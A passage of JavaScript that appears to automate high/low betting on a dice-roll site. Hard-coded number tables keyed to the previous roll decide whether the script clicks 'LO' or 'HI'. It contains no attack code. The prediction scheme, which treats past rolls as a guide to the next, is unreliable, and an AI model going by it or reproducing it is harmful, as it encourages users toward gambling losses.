    var num_045 = ['001', '002', '005', '011', '013', '014', '015', '016', '017', '018', '019', '021', '022', '024', '028', '031', '032', '033', '034', '035', '037', '041', '044', '045', '048', '051', '052', '053', '055', '061', '063', '067', '068', '069', '073', '075', '077', '078', '080', '081', '086', '088', '089', '092', '094', '096', '098'];
    var num_046 = ['002', '003', '007', '008', '010', '011', '013', '016', '017', '018', '021', '022', '028', '030', '031', '032', '036', '038', '041', '042', '043', '046', '048', '049', '050', '051', '054', '058', '059', '060', '065', '066', '069', '070', '071', '073', '076', '077', '078', '079', '082', '083', '085', '088', '089', '093', '097', '099'];
    var num_047 = ['001', '002', '003', '007', '008', '009', '010', '012', '013', '014', '016', '018', '019', '020', '022', '023', '025', '026', '027', '029', '032', '033', '034', '036', '045', '046', '049', '053', '054', '056', '057', '058', '061', '062', '064', '073', '075', '076', '077', '079', '081', '084', '087', '088', '089', '090', '091', '092', '094', '095', '098', '099'];
    var num_048 = ['000', '001', '002', '004', '006', '007', '008', '009', '010', '012', '013', '014', '015', '016', '017', '019', '021', '022', '023', '026', '028', '032', '033', '034', '036', '037', '039', '040', '042', '047', '050', '051', '054', '055', '056', '057', '058', '059', '061', '064', '065', '066', '067', '069', '070', '073', '074', '075', '080', '081', '083', '085', '087', '088', '089', '090', '091', '094', '095', '096', '097'];
    var num_049 = ['002', '004', '006', '007', '008', '012', '019', '020', '021', '023', '024', '027', '032', '033', '035', '037', '040', '041', '045', '047', '048', '049', '054', '056', '057', '060', '061', '065', '066', '068', '071', '072', '074', '078', '080', '081', '082', '086', '091', '096', '097'];
    var num_050 = ['001', '004', '005', '006', '009', '012', '014', '015', '017', '019', '021', '023', '025', '027', '032', '035', '036', '037', '039', '042', '043', '044', '050', '052', '053', '054', '060', '064', '066', '067', '068', '070', '076', '084', '087', '088', '097'];
    var num_051 = ['003', '006', '007', '013', '014', '015', '016', '019', '022', '024', '025', '026', '027', '028', '029', '034', '037', '038', '039', '040', '041', '042', '044', '048', '050', '051', '056', '057', '058', '059', '060', '062', '064', '065', '066', '070', '071', '073', '074', '076', '077', '080', '081', '083', '085', '086', '087', '094', '095', '096', '098'];
    var num_052 = ['004', '005', '009', '012', '013', '014', '015', '018', '024', '027', '029', '031', '032', '033', '034', '036', '038', '043', '045', '046', '047', '048', '049', '051', '052', '055', '056', '057', '058', '060', '061', '062', '064', '065', '071', '075', '077', '078', '081', '082', '083', '085', '086', '087', '088', '090', '091', '092', '093', '095', '098', '099'];
    var num_053 = ['000', '004', '006', '008', '009', '011', '013', '014', '016', '017', '018', '019', '024', '025', '026', '029', '030', '032', '034', '037', '038', '039', '040', '044', '047', '050', '051', '052', '053', '054', '057', '058', '061', '062', '064', '066', '067', '070', '072', '074', '075', '076', '078', '082', '085', '086', '087', '090', '094', '095', '097', '098'];
    var num_054 = ['000', '003', '004', '005', '007', '008', '011', '013', '015', '017', '018', '021', '022', '023', '024', '025', '030', '031', '032', '035', '036', '037', '042', '043', '044', '058', '059', '060', '062', '063', '066', '070', '071', '075', '076', '079', '080', '087', '088', '089', '090', '092', '094', '098', '099'];
    var num_055 = ['003', '004', '009', '010', '011', '012', '013', '016', '017', '018', '019', '020', '027', '030', '033', '034', '035', '036', '037', '040', '041', '042', '044', '046', '050', '054', '055', '064', '065', '066', '071', '072', '076', '077', '079', '080', '081', '085', '088', '089', '092', '093', '097', '098', '099'];
    var num_056 = ['000', '001', '003', '005', '006', '007', '009', '011', '018', '019', '020', '021', '026', '028', '031', '032', '034', '036', '037', '039', '042', '045', '046', '047', '048', '050', '051', '052', '054', '055', '056', '059', '061', '063', '068', '069', '074', '075', '076', '077', '080', '081', '083', '084', '086', '087', '088', '089', '091', '092', '094', '095', '096', '098'];
    var num_057 = ['000', '003', '004', '005', '007', '011', '012', '013', '015', '016', '019', '020', '025', '027', '028', '031', '034', '035', '036', '038', '039', '040', '042', '047', '048', '050', '051', '052', '053', '055', '056', '057', '058', '061', '064', '070', '073', '075', '076', '077', '078', '082', '083', '089', '091', '092', '093', '094', '095', '098', '099'];
    var num_058 = ['000', '002', '004', '005', '006', '008', '009', '010', '012', '014', '018', '023', '026', '027', '030', '032', '036', '037', '039', '040', '041', '044', '046', '048', '050', '051', '053', '054', '055', '057', '059', '060', '061', '062', '064', '067', '069', '070', '072', '075', '080', '081', '082', '083', '086', '091', '093', '097', '098', '099', '100'];
    var num_059 = ['001', '002', '003', '004', '006', '007', '010', '015', '016', '017', '021', '026', '027', '028', '031', '032', '038', '040', '041', '045', '046', '048', '049', '050', '051', '052', '056', '059', '060', '061', '062', '064', '067', '068', '069', '072', '073', '074', '075', '076', '077', '079', '082', '084', '087', '088', '090', '092', '093', '096', '098'];
    var num_060 = ['000', '001', '002', '004', '005', '007', '008', '010', '011', '012', '013', '014', '018', '020', '021', '026', '027', '029', '034', '035', '036', '037', '039', '040', '041', '042', '044', '045', '046', '047', '048', '050', '052', '053', '056', '058', '059', '060', '061', '066', '070', '071', '072', '073', '074', '075', '076', '077', '079', '083', '084', '085', '086', '087', '088', '090', '092', '095', '096', '098'];
    var num_061 = ['000', '007', '008', '009', '010', '011', '016', '018', '019', '021', '023', '024', '028', '029', '031', '034', '036', '037', '042', '044', '045', '046', '048', '049', '050', '052', '055', '057', '060', '061', '062', '063', '064', '066', '067', '070', '072', '074', '075', '076', '080', '082', '086', '088', '089', '092', '095', '099'];
    var num_062 = ['000', '004', '006', '009', '011', '014', '016', '017', '019', '021', '022', '023', '024', '026', '027', '028', '029', '030', '032', '034', '039', '043', '049', '050', '052', '053', '054', '056', '058', '059', '062', '064', '065', '066', '067', '068', '069', '070', '071', '072', '073', '075', '077', '078', '080', '081', '082', '094', '098'];
    var num_063 = ['001', '002', '005', '006', '008', '011', '014', '017', '019', '021', '024', '025', '030', '033', '037', '038', '039', '040', '041', '046', '048', '049', '050', '051', '052', '054', '055', '058', '059', '061', '065', '067', '068', '069', '075', '078', '079', '080', '083', '084', '087', '088', '089', '090', '092', '096', '097', '098'];
    var num_064 = ['004', '006', '008', '010', '013', '014', '015', '016', '017', '018', '019', '021', '027', '029', '033', '034', '036', '037', '039', '040', '041', '044', '045', '049', '054', '055', '056', '057', '060', '061', '062', '063', '064', '065', '066', '067', '068', '069', '070', '073', '075', '078', '080', '081', '083', '087', '089', '091', '096', '097', '098', '099'];
    var num_065 = ['000', '001', '002', '004', '005', '006', '008', '010', '012', '014', '015', '017', '018', '020', '023', '025', '026', '029', '032', '033', '034', '036', '037', '040', '041', '043', '046', '047', '052', '053', '055', '056', '058', '061', '066', '067', '068', '069', '070', '072', '073', '074', '076', '078', '079', '080', '083', '084', '086', '089', '090', '091', '092', '093', '096', '097', '098', '099'];
    var num_066 = ['000', '001', '007', '009', '010', '013', '015', '020', '021', '022', '024', '025', '027', '032', '035', '037', '038', '039', '040', '042', '043', '044', '046', '047', '048', '049', '050', '051', '053', '054', '055', '060', '062', '063', '064', '065', '068', '074', '077', '079', '080', '081', '084', '085', '087', '090', '091', '092', '096', '100'];
    var num_067 = ['006', '007', '008', '009', '011', '012', '013', '014', '017', '020', '021', '023', '024', '025', '028', '029', '033', '035', '036', '039', '040', '041', '042', '043', '044', '045', '046', '049', '053', '057', '058', '059', '061', '062', '063', '064', '065', '069', '081', '086', '087', '089', '090', '091', '095', '099'];
    var num_068 = ['000', '002', '004', '005', '006', '009', '012', '013', '015', '016', '018', '019', '023', '025', '026', '030', '031', '033', '034', '035', '038', '039', '041', '042', '043', '044', '046', '048', '049', '052', '053', '054', '058', '059', '063', '064', '066', '067', '068', '071', '074', '080', '084', '086', '088', '091', '098'];
    var num_069 = ['000', '001', '002', '003', '004', '007', '008', '009', '011', '013', '014', '016', '017', '018', '019', '020', '021', '022', '024', '026', '030', '031', '032', '033', '034', '035', '036', '037', '038', '039', '040', '041', '043', '045', '046', '047', '048', '050', '051', '055', '058', '062', '063', '064', '066', '067', '069', '072', '074', '079', '080', '081', '082', '083', '084', '085', '086', '089', '094'];
    var num_070 = ['002', '003', '006', '008', '010', '011', '017', '018', '019', '020', '021', '022', '023', '030', '031', '034', '035', '036', '038', '041', '044', '045', '046', '047', '048', '049', '051', '052', '053', '059', '060', '062', '063', '065', '072', '073', '075', '076', '077', '078', '079', '080', '082', '083', '085', '087', '090', '091', '094', '095', '099'];
    var num_071 = ['002', '003', '004', '005', '006', '008', '010', '011', '012', '014', '015', '016', '017', '019', '020', '021', '027', '028', '029', '030', '034', '036', '040', '041', '042', '045', '047', '048', '051', '055', '056', '058', '062', '063', '064', '067', '070', '073', '074', '078', '079', '080', '084', '085', '087', '088', '089', '093', '094', '095', '096', '098', '099', '100'];
    var num_072 = ['001', '002', '003', '004', '008', '009', '013', '014', '015', '019', '021', '023', '024', '025', '026', '027', '030', '032', '033', '034', '037', '038', '040', '048', '049', '050', '051', '055', '056', '057', '059', '060', '064', '065', '066', '068', '072', '073', '074', '075', '076', '077', '079', '081', '083', '084', '086', '087', '088', '089', '092', '093', '094', '095', '096'];
    var num_073 = ['001', '002', '009', '011', '013', '015', '018', '020', '022', '023', '024', '026', '031', '033', '035', '043', '046', '049', '053', '054', '056', '058', '060', '061', '062', '064', '067', '070', '074', '075', '076', '078', '081', '084', '085', '086', '087', '088', '091', '094', '098'];
    var num_074 = ['001', '002', '005', '006', '008', '010', '013', '017', '020', '021', '025', '027', '028', '029', '030', '033', '034', '036', '037', '039', '041', '042', '043', '045', '047', '049', '050', '051', '052', '055', '056', '058', '059', '060', '063', '064', '065', '067', '068', '071', '074', '076', '077', '083', '084', '085', '087', '089', '091', '093', '094', '095'];
    var num_075 = ['000', '002', '004', '007', '008', '009', '010', '012', '015', '016', '020', '022', '023', '024', '026', '027', '028', '030', '032', '037', '040', '041', '042', '046', '048', '049', '054', '055', '060', '062', '063', '065', '066', '067', '072', '076', '078', '079', '080', '082', '083', '084', '085', '086', '087', '088', '091', '095', '096', '097', '098', '099'];
    var num_076 = ['000', '002', '006', '010', '011', '012', '013', '014', '016', '018', '026', '028', '029', '032', '033', '035', '037', '039', '040', '042', '043', '045', '046', '047', '048', '049', '050', '051', '052', '053', '055', '057', '058', '059', '062', '063', '064', '068', '069', '071', '074', '075', '077', '081', '086', '088', '089', '092', '095', '097', '099'];
    var num_077 = ['000', '002', '007', '008', '011', '015', '018', '019', '021', '023', '024', '026', '028', '029', '032', '034', '035', '036', '037', '039', '041', '043', '046', '047', '048', '050', '051', '052', '059', '060', '063', '065', '067', '069', '070', '072', '075', '076', '077', '078', '081', '084', '086', '089', '091', '093', '096'];
    var num_078 = ['001', '002', '003', '004', '005', '010', '012', '016', '017', '019', '020', '023', '026', '027', '028', '029', '034', '035', '036', '038', '040', '044', '045', '046', '047', '050', '051', '053', '055', '057', '060', '063', '064', '065', '067', '070', '071', '075', '080', '083', '089'];
    var num_079 = ['000', '001', '002', '003', '004', '005', '006', '007', '008', '010', '011', '012', '014', '015', '019', '021', '024', '028', '029', '030', '033', '034', '038', '039', '041', '042', '044', '045', '046', '049', '051', '054', '056', '058', '064', '065', '067', '068', '070', '072', '076', '077', '078', '079', '084', '088', '090', '091', '092', '096', '097', '098', '099'];
    var num_080 = ['002', '005', '006', '007', '013', '014', '015', '016', '017', '019', '020', '022', '023', '025', '026', '027', '031', '033', '034', '035', '037', '041', '044', '045', '046', '048', '051', '052', '053', '054', '055', '057', '058', '059', '060', '061', '062', '064', '065', '070', '071', '072', '073', '075', '076', '077', '081', '082', '083', '086', '089', '090', '091', '094', '096'];
    var num_081 = ['001', '003', '004', '005', '006', '011', '013', '014', '015', '019', '021', '023', '024', '025', '026', '028', '031', '032', '033', '034', '036', '037', '038', '042', '045', '047', '050', '052', '054', '056', '057', '058', '059', '064', '067', '068', '072', '073', '075', '076', '079', '081', '082', '086', '088', '090', '091', '092', '093', '095', '096', '097', '098', '099'];
    var num_082 = ['002', '003', '006', '010', '011', '013', '014', '016', '018', '019', '020', '021', '022', '024', '029', '030', '031', '032', '036', '038', '040', '041', '042', '043', '044', '055', '056', '058', '059', '061', '063', '066', '067', '068', '072', '074', '075', '076', '078', '079', '080', '082', '085', '086', '087', '089', '092', '094', '095', '096', '097', '098', '099'];
    var num_083 = ['002', '003', '006', '009', '010', '015', '016', '017', '018', '019', '020', '021', '023', '024', '028', '030', '031', '032', '034', '038', '040', '043', '044', '045', '047', '050', '052', '053', '057', '059', '060', '061', '062', '063', '066', '067', '068', '069', '071', '073', '078', '084', '085', '086', '088', '089', '091', '092', '095', '096', '097', '098'];
    var num_084 = ['000', '001', '002', '006', '007', '008', '013', '017', '022', '023', '028', '029', '033', '037', '038', '044', '045', '046', '047', '051', '056', '061', '062', '063', '065', '066', '067', '069', '070', '072', '073', '074', '078', '079', '081', '082', '086', '087', '089', '090', '091', '092', '094', '097'];
    var num_085 = ['000', '001', '002', '005', '007', '008', '010', '012', '013', '015', '016', '018', '019', '021', '022', '024', '025', '026', '032', '033', '034', '038', '039', '040', '047', '049', '050', '051', '057', '058', '061', '062', '064', '066', '067', '069', '071', '072', '074', '075', '076', '081', '083', '085', '088', '089', '090', '092', '093', '096'];
    var num_086 = ['000', '002', '003', '005', '006', '010', '011', '013', '015', '016', '017', '019', '020', '022', '023', '025', '033', '036', '039', '040', '041', '044', '047', '053', '054', '058', '060', '061', '062', '065', '070', '071', '078', '083', '084', '085', '087', '088', '091', '092', '093', '095', '096', '098'];
    var num_087 = ['001', '002', '003', '004', '010', '011', '013', '014', '018', '020', '022', '023', '024', '026', '029', '030', '031', '033', '035', '038', '042', '043', '044', '045', '047', '048', '049', '050', '051', '052', '053', '054', '055', '057', '060', '062', '067', '071', '072', '073', '075', '077', '078', '079', '084', '087', '088', '089', '091', '093', '094', '095', '097', '098', '099', '100'];
    var num_088 = ['002', '003', '007', '009', '010', '011', '012', '013', '015', '016', '019', '024', '025', '026', '031', '032', '033', '035', '036', '040', '042', '044', '046', '048', '049', '052', '053', '054', '055', '059', '060', '062', '063', '065', '067', '069', '070', '076', '078', '081', '082', '084', '085', '088', '089', '091', '092', '093', '096', '099'];
    var num_089 = ['002', '005', '007', '010', '011', '014', '015', '016', '018', '022', '023', '025', '027', '028', '029', '030', '033', '036', '040', '041', '042', '044', '049', '055', '057', '058', '060', '062', '063', '066', '068', '071', '072', '082', '084', '085', '086', '087', '089', '090', '093', '094', '096', '099'];
    var num_090 = ['007', '009', '011', '014', '023', '028', '029', '030', '032', '033', '034', '036', '037', '038', '039', '040', '041', '042', '043', '045', '046', '050', '052', '053', '055', '057', '059', '062', '066', '068', '069', '070', '072', '073', '080', '081', '082', '084', '087', '090', '091', '092', '095', '096', '098', '099'];
    var num_091 = ['000', '001', '007', '009', '010', '011', '012', '013', '014', '015', '016', '019', '022', '025', '026', '027', '028', '031', '032', '034', '035', '037', '038', '039', '040', '041', '043', '044', '046', '048', '050', '051', '053', '058', '061', '062', '063', '064', '065', '066', '071', '072', '074', '075', '076', '078', '079', '080', '081', '082', '084', '085', '088', '092', '093', '095', '097', '098'];
    var num_092 = ['002', '004', '005', '007', '008', '009', '010', '012', '016', '017', '020', '021', '023', '024', '025', '028', '029', '031', '032', '033', '034', '035', '036', '037', '039', '041', '042', '043', '044', '049', '051', '052', '053', '057', '058', '063', '066', '068', '069', '070', '071', '072', '074', '077', '079', '080', '084', '085', '086', '087', '090', '091', '095', '097', '098'];
    var num_093 = ['003', '005', '006', '010', '011', '012', '015', '016', '017', '021', '022', '024', '027', '030', '033', '034', '036', '037', '039', '041', '047', '049', '050', '051', '053', '054', '057', '058', '060', '062', '064', '071', '073', '074', '075', '077', '079', '084', '090', '096', '098', '099'];
    var num_094 = ['001', '003', '010', '013', '014', '015', '016', '017', '018', '019', '020', '021', '022', '023', '025', '028', '029', '030', '032', '033', '034', '035', '036', '042', '044', '045', '046', '048', '049', '052', '056', '060', '064', '065', '067', '070', '076', '078', '079', '080', '081', '082', '083', '084', '086', '088', '094', '095', '096', '097', '098', '099', '100'];
    var num_095 = ['000', '002', '004', '006', '007', '009', '010', '014', '015', '018', '019', '020', '021', '022', '023', '024', '032', '033', '035', '036', '040', '041', '042', '043', '045', '046', '049', '051', '053', '054', '057', '058', '060', '062', '066', '069', '080', '081', '083', '085', '087', '089', '090', '091', '092', '094', '098', '099'];
    var num_096 = ['003', '008', '011', '014', '015', '016', '018', '020', '023', '025', '026', '028', '030', '032', '033', '035', '037', '046', '047', '050', '051', '053', '056', '057', '058', '063', '064', '065', '071', '072', '073', '074', '075', '077', '079', '082', '083', '086', '087', '090', '091', '094', '096', '099'];
    var num_097 = ['001', '002', '003', '005', '006', '007', '012', '015', '016', '018', '020', '022', '025', '028', '032', '033', '034', '035', '036', '037', '038', '039', '041', '043', '044', '048', '049', '050', '051', '052', '053', '054', '055', '056', '059', '060', '063', '064', '065', '066', '067', '068', '070', '071', '075', '077', '078', '079', '083', '084', '088', '089', '090', '092', '093', '094', '095', '097', '099'];
    var num_098 = ['004', '006', '010', '011', '017', '018', '020', '022', '023', '025', '027', '028', '030', '033', '034', '036', '037', '041', '042', '044', '045', '047', '048', '050', '051', '052', '056', '059', '062', '064', '065', '066', '069', '071', '073', '075', '076', '077', '078', '081', '082', '084', '089', '090', '091', '092', '093', '096', '098', '099'];
    var num_099 = ['002', '005', '008', '009', '011', '015', '018', '019', '020', '021', '027', '028', '030', '031', '033', '034', '035', '037', '038', '042', '044', '045', '048', '049', '050', '051', '052', '054', '055', '056', '057', '058', '060', '067', '068', '070', '072', '073', '074', '076', '077', '079', '080', '082', '087', '088', '092', '093', '094', '095', '096', '097'];
    if ((vLastRollABC == '000') && num_000.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '000') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '001') && num_001.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '001') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '002') && num_002.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '002') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '004') && num_004.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '004') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '005') && num_005.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '005') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '006') && num_006.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '006') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '007') && num_007.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '007') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '008') && num_008.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '008') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '011') && num_011.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '011') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '013') && num_013.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '013') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '014') && num_014.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '014') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '015') && num_015.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '015') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '023') && num_023.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '023') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '024') && num_024.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '024') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '027') && num_027.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '027') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '028') && num_028.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '028') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '031') && num_031.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '031') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '034') && num_034.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '034') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '037') && num_037.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '037') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '038') && num_038.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '038') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '040') && num_040.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '040') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '044') && num_044.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '044') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '045') && num_045.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '045') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '046') && num_046.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '046') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '047') && num_047.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '047') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '048') && num_048.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '048') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '049') && num_049.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '049') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '050') && num_050.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '050') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '053') && num_053.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '053') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '054') && num_054.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '054') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '055') && num_055.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '055') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '056') && num_056.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '056') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '057') && num_057.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '057') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '058') && num_058.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '058') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '059') && num_059.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '059') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '061') && num_061.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '061') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '062') && num_062.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '062') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '063') && num_063.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '063') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '064') && num_064.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '064') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '066') && num_066.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '066') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '068') && num_068.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '068') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '070') && num_070.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '070') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '072') && num_072.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '072') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '073') && num_073.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '073') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '075') && num_075.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '075') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '076') && num_076.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '076') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '078') && num_078.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '078') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '079') && num_079.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '079') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '082') && num_082.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '082') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '084') && num_084.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '084') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '085') && num_085.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '085') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '086') && num_086.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '086') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '087') && num_087.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '087') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '088') && num_088.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '088') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '089') && num_089.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '089') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '090') && num_090.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '090') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '093') && num_093.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '093') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '094') && num_094.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '094') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '095') && num_095.includes(ROLL_B)) {
        LO.click()
    } else if (vLastRollABC == '095') {
        nonExclusiveClick()
    }
    if ((vLastRollABC == '003') && num_003.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '003') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '009') && num_009.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '009') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '010') && num_010.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '010') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '012') && num_012.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '012') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '016') && num_016.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '016') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '017') && num_017.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '017') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '018') && num_018.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '018') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '019') && num_019.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '019') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '020') && num_020.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '020') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '021') && num_021.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '021') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '022') && num_022.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '022') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '025') && num_025.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '025') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '026') && num_026.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '026') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '029') && num_029.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '029') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '030') && num_030.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '030') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '032') && num_032.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '032') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '033') && num_033.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '033') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '035') && num_035.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '035') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '036') && num_036.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '036') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '039') && num_039.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '039') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '041') && num_041.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '041') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '042') && num_042.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '042') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '043') && num_043.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '043') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '051') && num_051.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '051') {
        nonExclusiveClickLO()
    }
    if ((vLastRollABC == '052') && num_052.includes(ROLL_B)) {
        HI.click()
    } else if (vLastRollABC == '052') {
